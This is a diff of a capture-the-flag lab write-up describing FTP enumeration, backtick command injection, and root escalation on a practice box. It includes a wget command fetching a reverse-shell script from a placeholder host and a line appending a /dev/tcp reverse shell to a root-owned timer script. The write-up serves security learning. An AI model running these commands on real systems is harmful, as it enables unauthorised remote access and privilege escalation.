@@ -24,17 +24,25 @@ In the ftp directories is some rather interesting stuff, it looks like:
 
 ![PIC_FTP1](https://user-images.githubusercontent.com/93183445/140650439-3f17a701-b07c-4d76-aa5b-7c7bcc692865.png)
 
-Let's explore and take a look around :)
+message.txt:  
+<code>Daedalus is a clumsy person, he forgets a lot of things arount the labyrinth, have a look around, maybe you'll find something :)
+-- Minotaur</code>
+
+Let's explore further :)
 
 ![PIC_FTP2](https://user-images.githubusercontent.com/93183445/140650455-e0da12ec-90bd-451b-978c-88a7b2a8506e.png)
 
 Aaaand we got the fist flag!!!
 
+keep_in_mind.txt (this info will come in handy a bit later):  
+<code>Not to forget, he forgets a lot of stuff, that's why he likes to keep things on a timer ... literally
+-- Minotaur</code>
+
 While ffuf is still running, I'm going to take a look at the website:
 
 ![PIC_WEB1](https://user-images.githubusercontent.com/93183445/140650473-eaeb3905-efe9-4ea6-928d-c58b19b691a5.png)
 
-No matter what I typed in, there seems to happen no response what so ever. Let's take a look at the source:\
+No matter what I typed in, there seems to happen no response what so ever. Let's take a look at the source:  
 (The hyperlinks are not what they seem, but go for it, if you feel adventurous, lol)
 
 The source code reveals:
@@ -117,19 +125,19 @@ No matter what I was trying in regards to command injection, it didn't get me co
 This site led me finally to using backticks, instead of quotation marks.  
 [https://book.hacktricks.xyz/pentesting-web/command-injection](https://book.hacktricks.xyz/pentesting-web/command-injection)
 
-\`ls\`
+\`ls\` shows us:
 
 ![PIC_RCE1](https://user-images.githubusercontent.com/93183445/140650956-67398bff-8298-49e7-920f-57642485ca02.png)
 
 So we got rce, let's explore that. And we can find flag3 in the user home directory, which we also are able to read.  
 
-\`cat /home/user\`
+Let's try \`cat /home/user\`
 
 ![PIC_RCE2](https://user-images.githubusercontent.com/93183445/140650965-b12da9b1-b7f2-4923-9fc0-c2333e4a7158.png)
 
-Let's get a shell then. I had to try a few things and ended up with:
+Okidoky.. Let's get a shell then. I had to try a few things and ended up with:
 
-\`/usr/bin/wget <IP>/rev.txt -O /tmp/rev.sh\`
+\`/usr/bin/wget YOUR-IP/rev.txt -O /tmp/rev.sh\`
 
 Content of rev.txt ([https://www.revshells.com](https://www.revshells.com)):
   
@@ -149,12 +157,14 @@ and execute the freshly downloaded reverse shell on the target:
 
 ![PIC_REV2](https://user-images.githubusercontent.com/93183445/140651333-9964013c-007a-45ff-b3f1-e1d662fa0927.png)
 
-After running linpeas.sh and searching around for a bit, I got a tip. There's a file in the root directory\
-that we can write to. Plus it is owned by root.. So let's abuse that and pack a rev-shell in that very file :)
+After running linpeas.sh and searching around for a bit, I got a tip. Remember the content of one of the files we  
+found in the ftp earlier. There a timer is mentioned (didn't make the connection, I got a tip..).  
+There's a file in the root directory that we can write to.  
+Plus it is owned by root.. So let's abuse that and pack a rev-shell in that very file :)
 
 ![PIC_REV3](https://user-images.githubusercontent.com/93183445/140651338-c8f5a0cf-5939-4dac-ab46-d50150fe698f.png)
   
-<code>echo 'sh -i >& /dev/tcp/<IP>/6666 0>&1' >> timer.sh</code>  
+<code>echo 'sh -i >& /dev/tcp/YOUR-IP/6666 0>&1' >> timer.sh</code>  
 
 Start another listener and it will connect without any further doing. Now you're root _tataaaa_ \
 So let's go and get the final flag in the /root directory:
